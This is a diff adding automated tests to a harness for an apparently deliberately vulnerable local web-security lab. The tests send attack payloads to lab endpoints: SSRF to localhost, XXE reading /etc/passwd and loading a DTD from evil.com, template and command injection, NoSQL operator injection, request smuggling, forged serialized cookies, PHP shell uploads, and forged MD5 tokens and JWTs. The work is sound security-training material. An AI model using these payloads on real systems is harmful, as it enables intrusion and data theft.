@@ -43,9 +43,75 @@ await t("ac-4 api", "/lab/ac-4/api/change-email", { method: "POST", headers: { "
 await t("ac-5 POST", "/lab/ac-5/admin", { method: "POST" });
 await t("ac-6 ref", "/lab/ac-6/admin", { headers: { Referer: "http://x/admin" } });
 await t("cj-1 page", "/lab/cj-1");
+
+// ---------- extra categories ----------
+// SSRF
+await t("ssrf-1 local", "/lab/ssrf-1?stockApi=http://localhost:8787/lab/ssrf-1/admin");
+await t("ssrf-2 dec", "/lab/ssrf-2?stockApi=http://2130706433/lab/ssrf-2/admin");
+await t("ssrf-3 allowlist", "/lab/ssrf-3?stockApi=http://192.168.0.12:8080@2130706433/lab/ssrf-3/admin");
+await t("ssrf-4 inject", "/lab/ssrf-4?stockApi=http://example.com/x");
+await t("ssrf-4 log", "/lab/ssrf-4/log");
+// XXE
+const xxe1 = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>1</productId></stockCheck>';
+await t("xxe-1 passwd", "/lab/xxe-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "xml=" + encodeURIComponent(xxe1) });
+const xxe2 = '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><text>&xxe;</text></svg>';
+await t("xxe-2 svg", "/lab/xxe-2", { method: "POST", headers: { "Content-Type": "application/xml" }, body: xxe2 });
+const xxe3 = '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><stockCheck><productId>1</productId></stockCheck>';
+await t("xxe-3 inject", "/lab/xxe-3", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "xml=" + encodeURIComponent(xxe3) });
+await t("xxe-3 log", "/lab/xxe-3/log");
+const xxe4 = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin">]><stockCheck><productId>1</productId></stockCheck>';
+await t("xxe-4 ssrf", "/lab/xxe-4", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "xml=" + encodeURIComponent(xxe4) });
+// SSTI
+await t("ssti-1 arith", "/lab/ssti-1?name=" + encodeURIComponent("{{7*7}}"));
+await t("ssti-2 flag", "/lab/ssti-2?name=" + encodeURIComponent("{{FLAG}}"));
+await t("ssti-3 block", "/lab/ssti-3?name=" + encodeURIComponent("{% print(7*7) %}"));
+await t("ssti-4 flag", "/lab/ssti-4?name=" + encodeURIComponent("{{FLAG}}"));
+// command injection
+await t("cmdi-1 exec", "/lab/cmdi-1?storeId=1;whoami");
+await t("cmdi-2 inject", "/lab/cmdi-2?storeId=1;whoami");
+await t("cmdi-2 log", "/lab/cmdi-2/log");
+await t("cmdi-3 newline", "/lab/cmdi-3?storeId=1%0Awhoami");
+// NoSQL
+await t("nosql-1 ne", "/lab/nosql-1", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"username":"administrator","password":{"$ne":""}}' });
+await t("nosql-2 regex", "/lab/nosql-2?username%5B%24regex%5D=%5Eadministrator");
+await t("nosql-3 op", "/lab/nosql-3", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"username":{"$regex":"^adm"}}' });
+// request smuggling
+await t("smug-1 clte", "/lab/smug-1", { method: "POST", headers: { "Content-Type": "text/plain", "Transfer-Encoding": "chunked", "Content-Length": "200" }, body: "0\r\n\r\nGET /lab/smug-1/admin HTTP/1.1\r\nX: 1" });
+await t("smug-2 tecl", "/lab/smug-2", { method: "POST", headers: { "Content-Type": "text/plain", "Transfer-Encoding": "chunked" }, body: "GET /lab/smug-2/admin HTTP/1.1\r\nX: 1" });
+await t("smug-3 tete", "/lab/smug-3", { method: "POST", headers: { "Content-Type": "text/plain", "Transfer-Encoding": "xchunked" }, body: "GET /lab/smug-3/admin HTTP/1.1\r\nX: 1" });
+// deserialization
+const deser1 = btoa('O:4:"User":2:{s:2:"id";i:1;s:7:"isAdmin";b:1;}');
+await t("deser-1 role", "/lab/deser-1", { headers: { Cookie: "session=" + deser1 } });
+const deser2 = btoa('O:8:"Gadget":1:{s:8:"filename";s:5:"/flag";}');
+await t("deser-2 gadget", "/lab/deser-2", { headers: { Cookie: "pref=" + deser2 } });
+// file upload
+await t("upload-1 php", "/lab/upload-1", { method: "POST", headers: { "Content-Type": "multipart/form-data; boundary=X" }, body: '--X\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php echo 1;\r\n--X--' });
+await t("upload-2 ct", "/lab/upload-2", { method: "POST", headers: { "Content-Type": "image/png; boundary=X" }, body: '--X\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php echo 1;\r\n--X--' });
+await t("upload-3 php5", "/lab/upload-3", { method: "POST", headers: { "Content-Type": "multipart/form-data; boundary=X" }, body: '--X\r\nContent-Disposition: form-data; name="file"; filename="shell.php5"\r\n\r\n<?php echo 1;\r\n--X--' });
+// business logic
+await t("bl-1 price", "/lab/bl-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "productId=1&price=-1" });
+await t("bl-2 qty", "/lab/bl-2", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "quantity=-1" });
+await t("bl-3 coupon1", "/lab/bl-3", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "coupon=NEWCUST15" });
+await t("bl-3 coupon2", "/lab/bl-3", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "coupon=NEWCUST15" });
+// race conditions
+const race1 = () => worker.fetch(new Request(base + "/lab/race-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "coupon=RACE50" }), {});
+const race1r = await Promise.all([race1(), race1()]);
+console.log(`race-1 parallel    status=${race1r[0].status} solved=${race1r[0].headers.get("x-lab-solved") || "-"} / ${race1r[1].headers.get("x-lab-solved") || "-"}`);
+const race2 = (p) => worker.fetch(new Request(base + "/lab/race-2" + p, { method: "POST" }), {});
+const race2r = await Promise.all([race2("/email"), race2("/reset")]);
+console.log(`race-2 parallel    status=${race2r[0].status} solved=${race2r[0].headers.get("x-lab-solved") || "-"} / ${race2r[1].headers.get("x-lab-solved") || "-"}`);
+// weak crypto
+const carlosToken = await md5("carlos");
+await t("crypto-1 token", "/lab/crypto-1?username=carlos");
+await t("crypto-1 reset", "/lab/crypto-1/reset?token=" + carlosToken + "&username=carlos");
+const hdr = b64url('{"alg":"MD5"}');
+const pay = b64url('{"role":"admin"}');
+const sig = await md5("supersecret" + pay);
+await t("crypto-2 jwt", "/lab/crypto-2", { headers: { Authorization: "Bearer " + hdr + "." + pay + "." + sig } });
 await t("unknown", "/lab/nope");
 
 async function md5(s) {
   return crypto.createHash("md5").update(s).digest("hex");
 }
 function btoa(s) { return Buffer.from(s).toString("base64"); }
+function b64url(s) { return Buffer.from(s).toString("base64url"); }
